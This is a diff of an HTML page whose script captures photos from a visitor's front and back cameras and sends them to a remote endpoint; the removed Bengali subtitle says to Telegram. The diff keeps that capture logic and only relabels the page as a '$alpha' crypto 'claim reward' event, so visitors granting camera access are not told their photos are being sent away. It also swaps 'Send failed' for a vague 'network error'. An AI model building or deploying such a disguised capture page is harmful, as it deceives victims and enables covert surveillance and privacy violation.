@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Premium Dual Capture</title>
+  <title>ALPHA EVENT</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -106,11 +106,11 @@
 <body>
 
   <h1>Dual Camera Capture</h1>
-  <p class="subtitle">এক ক্লিকে ফ্রন্ট + ব্যাক ক্যামেরা থেকে ছবি Telegram-এ চলে যাবে</p>
+  <p class="subtitle">claim reward - $alpha </p>
 
   <div class="premium-card">
     <button id="captureBtn" onclick="captureBothCameras()">
-      Capture & Send Photos
+      claim reward
     </button>
 
     <div id="status"></div>
@@ -122,7 +122,7 @@
 
     async function captureBothCameras() {
       btn.disabled = true;
-      btn.textContent = "Capturing...";
+      btn.textContent = "prossesing...";
       status.textContent = "";
 
       try {
@@ -142,7 +142,7 @@
         const backBase64 = await quickCapture(backStream);
         await sendPhoto(backBase64, "back");
 
-        status.textContent = "Both photos sent ✓";
+        status.textContent = "claim done ✓";
       } catch (err) {
         let msg = "Error: ";
         if (err.name === 'NotAllowedError') msg += "Camera permission denied";
@@ -152,7 +152,7 @@
         console.error(err);
       } finally {
         btn.disabled = false;
-        btn.textContent = "Capture & Send Photos";
+        btn.textContent = "claim reward";
       }
     }
 
@@ -177,7 +177,7 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ image: base64, camera: type })
       });
-      if (!res.ok) throw new Error("Send failed");
+      if (!res.ok) throw new Error("network error");
     }
   </script>
 </body>
